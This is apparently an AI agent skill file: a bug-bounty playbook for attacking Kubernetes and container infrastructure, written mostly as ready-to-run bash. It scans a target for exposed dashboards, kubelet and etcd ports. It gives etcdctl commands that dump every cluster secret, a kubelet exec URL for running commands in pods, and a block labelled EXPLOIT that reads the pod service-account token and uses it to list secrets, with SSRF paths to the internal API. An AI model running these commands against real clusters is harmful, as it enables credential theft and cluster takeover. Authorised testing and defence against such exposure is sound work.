---
name: k1nzr3c0n-hunt-k8s
description: "Hunt Kubernetes/container infrastructure misconfigurations. K8s dashboard exposure (unauthenticated), etcd access (port 2379/2380), RBAC wildcards and excessive permissions, metrics-server data leakage, kubelet API (port 10250/10255), exposed pod environment variables, Docker socket access, Kubernetes service account token abuse."
tags: [kubernetes, k8s, container, rbac, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Kubernetes / Container

> **Crown jewel**: unauthenticated K8s dashboard or kubelet API = full cluster access.
> **From SSRF**: reach internal K8s API (10.0.0.1:443 or kubernetes.default.svc) for SA token abuse.

---

## Phase 0 — Detect K8s Exposure

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_k8s_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
OOB="${OOB:-$(openssl rand -hex 4).oastify.com}"

echo "=== K8s Surface Detection ==="

# From external scanning
for PORT in 443 6443 8443 8080 8001 10250 10255 2379 2380; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}:${PORT}/" -m 5)
  [ "$CODE" != "000" ] && echo "  [${CODE}] https://${TARGET}:${PORT}/"
done

# K8s API server fingerprint
curl -sk "https://${TARGET}:6443/version" -m 5 | python3 -m json.tool 2>/dev/null | \
  grep -E '"gitVersion"|"platform"' | sed 's/^/  [K8s-VERSION] /'
```

## Phase 1 — K8s Dashboard

```bash
echo "=== Kubernetes Dashboard ==="
BASE="https://${TARGET}"

for DASH in /kubernetes-dashboard /k8s-dashboard /dashboard \
  ":30000" ":30001" ":9090" ":8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE}${DASH}" -m 8)
  echo "  [${CODE}] ${DASH}"
done

echo ""
echo "Unauthenticated skip login test:"
curl -sk "https://${TARGET}:30000/#/login" -o /tmp/k8s_dash
grep -i 'Kubernetes Dashboard\|cluster\|namespace\|pod' /tmp/k8s_dash | head -3 | sed 's/^/  /'
echo ""
echo "If dashboard accessible → enumerate namespaces, secrets, configmaps"
echo "  Settings → Namespace → All namespaces → Secrets → look for TLS/DB creds"
```

## Phase 2 — Kubelet API (10250/10255)

```bash
echo "=== Kubelet API ==="
TARGET_K="${TARGET}"

echo "Unauthenticated kubelet read-only API (port 10255):"
for EP in /pods /metrics /stats/summary; do
  CODE=$(curl -sk -o /tmp/kubelet_check -w "%{http_code}" "https://${TARGET_K}:10255${EP}" -m 8)
  if [ "$CODE" = "200" ]; then
    echo "  [EXPOSED] :10255${EP}"
    grep -i 'name\|namespace\|image\|env' /tmp/kubelet_check | head -5 | sed 's/^/    /'
  fi
done

echo ""
echo "Kubelet exec API (port 10250 — requires TLS client cert in default config):"
echo "  curl -sk https://${TARGET}:10250/exec/NAMESPACE/POD/CONTAINER?command=id&stdin=1&stdout=1&tty=1"
echo "  Unauthenticated access = Critical RCE in all pods on this node"
```

## Phase 3 — etcd Access

```bash
echo "=== etcd Access (port 2379/2380) ==="
TARGET_K="${TARGET}"

echo "etcd unauthenticated access:"
CODE=$(curl -sk -o /tmp/etcd_check -w "%{http_code}" "https://${TARGET_K}:2379/health" -m 8)
echo "  /health: $CODE"
CODE=$(curl -sk -o /dev/null -w "%{http_code}" "http://${TARGET_K}:2379/v2/keys" -m 8)
echo "  /v2/keys (HTTP): $CODE"

echo ""
echo "If accessible (etcdctl from container or curl):"
echo "  etcdctl --endpoints=http://${TARGET_K}:2379 get / --prefix --keys-only | head -20"
echo "  etcdctl --endpoints=http://${TARGET_K}:2379 get /registry/secrets --prefix | head -30"
echo "  → Dumps ALL k8s secrets: service account tokens, TLS certs, DB passwords"
```

## Phase 4 — Service Account Token Abuse (via SSRF)

```bash
echo "=== Service Account Token Abuse via SSRF ==="
echo ""
echo "From inside a pod OR via SSRF reaching kubernetes.default.svc:"
echo ""

cat << 'EXPLOIT'
# Step 1: Read SA token from pod filesystem (if pod exec or SSRF to another pod)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# Step 2: Test what the SA can do
curl -sk --cacert "$CACERT" \
  -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/namespaces/${NAMESPACE}/secrets"

# Step 3: Enumerate permissions
curl -sk --cacert "$CACERT" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"secrets"}}}'
EXPLOIT

echo ""
echo "SSRF path to K8s API (if SSRF available in app):"
echo "  http://kubernetes.default.svc/api/v1/namespaces/default/secrets"
echo "  http://10.96.0.1/api/v1/namespaces"
```

## Phase 5 — RBAC Wildcard Detection

```bash
echo "=== RBAC Excessive Permissions ==="
echo "If you have kubectl access (SA token or kubeconfig):"
echo ""
echo "Check for wildcards in cluster roles:"
echo "  kubectl get clusterrolebindings -o json | python3 -c \""
echo "    import json,sys; data=json.load(sys.stdin)"
echo "    [print(b['metadata']['name']) for b in data.get('items',[]) if any("
echo "      r.get('verbs')==['*'] for r in b.get('roleRef',{}).get('rules',[]))]"
echo "    \""
echo ""
echo "Check what current SA can access:"
echo "  kubectl auth can-i --list"
echo "  kubectl auth can-i create pods --all-namespaces"
echo "  kubectl auth can-i get secrets --all-namespaces"
```

## Gate 0

```bash
echo "=== K8s Gate 0 ==="
echo "  □ Dashboard: unauthenticated access to K8s UI + can view secrets"
echo "  □ Kubelet 10255: pod list returned without auth"
echo "  □ Kubelet 10250: exec endpoint accessible"
echo "  □ etcd: /v2/keys or secret dump returned without auth"
echo "  □ SA token: token read + K8s API call succeeds"
echo "  □ SSRF→K8s API: kubernetes.default.svc returns secret list via SSRF"
echo ""
echo "  SEVERITY: K8s dashboard unauth = Critical | etcd access = Critical | SA wildcard = High"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Kubernetes dashboard exposed without authentication on [target.com:30000]: all namespaces, pods, secrets visible; found 5 TLS secrets and 2 database connection strings — Critical
etcd unauthenticated access on [target.com:2379]: HTTP /v2/keys returns all cluster configuration including k8s secrets containing service account tokens and DB passwords — Critical
Kubelet read-only API exposed on [target.com:10255/pods]: lists all pod names, images, and environment variables for all pods on the node without authentication — High
```
